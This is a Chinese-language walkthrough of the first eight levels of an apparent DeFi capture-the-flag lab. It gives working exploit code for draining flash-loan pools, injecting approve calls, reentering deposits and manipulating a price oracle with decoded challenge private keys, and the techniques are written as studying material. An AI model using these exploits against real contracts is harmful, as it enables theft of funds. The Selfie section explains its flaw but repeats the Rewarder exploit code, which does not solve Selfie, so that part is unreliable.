### 1.unstoppable
根据题目，即为攻击合约让他停止工作，在flashLoan函数里面有一句assert(poolBalance == balancebefore),所以让两者不相等即可 

方法即为：transfer 1 ether给合约 

攻击代码： 

 it('Exploit', async function () { 
 
     /** COOD YOUR EXPLOIT HIRE */ 
     
     await this.token.transfer(this.pool.address,1); 
     
 }); 
 
 ### 2.Naive receiver 
 
 题目要求：抽空用户合约里的所有eth 
 
 flashLoan函数以borrower借款 
 
 攻击代码： 
 
  it('Exploit', async function () { 
  
     /** COOD YOUR EXPLOIT HIRE */ 
     
     for(i=0;i<10;i++){ 
     
     await this.pool.flashLoan(this.receiver.address,0); 
     
     } 
     
  });  

  ### 3.Truster
  ##### call注入，data里调用approve给攻击者地址授权，然后再用transferfrom将钱转过来
```
  it('Exploit', async function () {
    const data = web3.eth.abi.encodeFunctionCall({
        name: 'approve',
        type: 'function',
        inputs: [{
            type: 'address',
            name: 'spender'
        },{
            type: 'uint256',
            name: 'amount'
        }]
    }, [attacker, TOKENS_IN_POOL.toString()]); 

    await this.pool.flashLoan(0, attacker, this.token.address, data);
    await this.token.transferFrom(this.pool.address, attacker, TOKENS_IN_POOL, { from: attacker });
});
```
### 4. Side entrance
从贷款池中借出一定量的 ETH 并通过 deposit() 函数将这部分 ETH 存入，那么在满足 address(this).balance >= balanceBefore 的同时，balances[msg.sender] 也会增加。然后我们再通过 withdraw() 函数取出，即可顺利提空贷款池中的内部金额
```
interface IFlashLoanEtherReceiver {
    function execute() external payable;
}

interface ISideEntranceLenderPool {
    function deposit() external payable;
    function withdraw() external;
    function flashLoan(uint256 amount) external;
}

contract AttackSideEntrance is IFlashLoanEtherReceiver {
    using Address for address payable;

    ISideEntranceLenderPool pool;

    function attack(ISideEntranceLenderPool _pool) public {
        pool = _pool;
        pool.flashLoan(address(_pool).balance);
        pool.withdraw();
        msg.sender.sendValue(address(this).balance);
    }

    function execute() external payable override {
        pool.deposit{value:msg.value}();
    }

    receive() external payable{}
}
const AttackSideEntrance = contract.fromArtifact('AttackSideEntrance');
// ...
it('Exploit', async function () {
    const attack = await AttackSideEntrance.new();
    await attack.attack(this.pool.address, { from: attacker });
});
```

### 5. The rewarder
##### 在某个时间节点借走了池中全部的 token 并通过 deposit() 函数放入 TheRewarderPool，主动触发 distributeRewards() 获得奖励，由于池中拥有的 1000000 ether 远远大于其他人存入的 100 ether，所以根据计算公式 reward = (amountDeposited * 100) / totalDeposits，最后其他人的收益会变成 0。
```
it('Exploit', async function () {
    await time.increase(time.duration.days(5));
    const attack = await AttackReward.new(this.liquidityToken.address, this.rewardToken.address, this.flashLoanPool.address, this.rewarderPool.address, { from: attacker});
    await attack.attack(TOKENS_IN_LENDER_POOL, { from: attacker });
});
```

### 6. Selfie
##### drainAllFunds() 会将全部的余额转给 receiver，但修饰符 onlyGovernance 限定了调用者，继续阅读相应的 SimpleGovernance 合约，可以发现 SimpleGovernance 合约的 executeAction() 预留了 call 函数来进行任意调用
const AttackReward = contract.fromArtifact('AttackReward');
```
it('Exploit', async function () {
    await time.increase(time.duration.days(5));
    const attack = await AttackReward.new(this.liquidityToken.address, this.rewardToken.address, this.flashLoanPool.address, this.rewarderPool.address, { from: attacker});
    await attack.attack(TOKENS_IN_LENDER_POOL, { from: attacker });
});
```

### 7.Compromised
可以发现无论是卖出还是买入，其价格均由 oracle.getMedianPrice(token.symbol()); 决定，而定位相应的源码，可以发现真正的计算公式如下：

function _computeMedianPrice(string memory symbol) private view returns (uint256) {
    uint256[] memory prices = _sort(getAllPricesForSymbol(symbol));

    // calculate median price
    if (prices.length % 2 == 0) {
        uint256 leftPrice = prices[(prices.length / 2) - 1];
        uint256 rightPrice = prices[prices.length / 2];
        return (leftPrice + rightPrice) / 2;
    } else {
        return prices[prices.length / 2];
    }
}
而唯一修改价格的方式如下：

modifier onlyTrustedSource() {
    require(hasRole(TRUSTED_SOURCE_ROLE, msg.sender));
    _;
}

function postPrice(string calldata symbol, uint256 newPrice) external onlyTrustedSource {
    _setPrice(msg.sender, symbol, newPrice);
}

function _setPrice(address source, string memory symbol, uint256 newPrice) private {
    uint256 oldPrice = pricesBySource[source][symbol];
    pricesBySource[source][symbol] = newPrice;
    emit UpdatedPrice(source, symbol, oldPrice, newPrice);
}
这意味着，当且仅当我们控制了 TrustedSource，我们就能控制购买的价格。此时恰好发现，题目提供的信息其实是其中两个 TrustedSource 的私钥：

#!/usr/bin/env python2

def get_private_key(bytes):
    return ''.join(bytes.split(' ')).decode('hex').decode('base64')

get_private_key('4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35')
# 0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9 => 0xe92401A4d3af5E446d93D11EEc806b1462b39D15
get_private_key('4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34')
# 0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48 => 0x81A5D6E50C214044bE44cA0CB057fe119097850c
通过我们控制的 TrustedSource，我们能任意修改买入卖出的价格，最后编写利用的代码如下：

it('Exploit', async function () {
    const leakedAccounts = ['0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9', '0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48'].map(pk=>web3.eth.accounts.privateKeyToAccount(pk));

    for (let account of leakedAccounts) {
        await web3.eth.personal.importRawKey(account.privateKey, '');
        web3.eth.personal.unlockAccount(account.address, '', 999999);
        // 修改最低价
        await this.oracle.postPrice('DVNFT', 0, { from: account.address });
    }
    // 买入
    await this.exchange.buyOne({ from: attacker, value: 1 });
    // 修改为最高价格
    const exchangeBalance = await balance.current(this.exchange.address);
    await this.oracle.postPrice("DVNFT", exchangeBalance, { from: leakedAccounts[0].address});
    await this.oracle.postPrice("DVNFT", exchangeBalance, { from: leakedAccounts[1].address});
    await this.token.approve(this.exchange.address, 1, { from: attacker });
    // 卖出
    await this.exchange.sellOne(1, { from: attacker })
});

### 8. Puppet
##### computeOraclePrice() 计算过程存在着一定问题，如果 uniswapOracle.balance < token.balanceOf(uniswapOracle)，那么得到的结果其实是 0：

function computeOraclePrice() public view returns (uint256) {
    return uniswapOracle.balance.div(token.balanceOf(uniswapOracle));
}
##### 先通过调用 Uniswap v1 提供的 tokenToEthSwapInput() 函数，将我们拥有的部分 token 转换成 ETH，满足 uniswapOracle.balance < token.balanceOf(uniswapOracle) 的要求，然后直接调用 borrow() 函数，用 0 的代价清空贷款池。编写利用的代码：
```
it('Exploit', async function () {
    const deadline = (await web3.eth.getBlock('latest')).timestamp + 300;
    await this.token.approve(this.uniswapExchange.address, ether('0.01'), { from: attacker });
    await this.uniswapExchange.tokenToEthSwapInput(ether('0.01'), 1, deadline, { from: attacker });
    await this.lendingPool.borrow(POOL_INITIAL_TOKEN_BALANCE, { from: attacker });
});
``` 
